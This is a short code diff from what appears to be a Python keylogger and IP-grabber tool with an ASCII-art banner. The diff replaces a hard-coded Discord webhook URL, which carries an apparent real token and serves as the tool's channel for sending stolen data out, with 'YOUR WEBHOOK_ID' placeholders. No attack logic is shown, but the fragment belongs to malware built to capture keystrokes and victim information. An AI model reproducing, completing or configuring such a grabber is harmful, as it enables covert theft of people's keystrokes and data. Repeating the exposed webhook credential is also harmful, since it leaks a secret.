@@ -30,7 +30,7 @@ ip_grabber_f = True
 key_logger = True
 today = date.today()
 
-ext = {"webhook-id": "https://discord.com/api/webhooks/1046505959188615198/nnz6-wn2x65rJN09NgN2kgebCzOy1ruurvRp3kHNCLI6xtFRwaXxbNZKwjI_hW_7OzKf", "webhook-name": "Grabber"}
+ext = {"webhook-id": "YOUR WEBHOOK_ID", "webhook-name": "YOUR WEBHOOK NAME"}
 
 banner = '''
  ▄▀▀▀▀▄     ▄▀▀█▄▄▄▄  ▄▀▀▄  ▄▀▄  ▄▀▀█▄       ▄▀▀▀▀▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ 
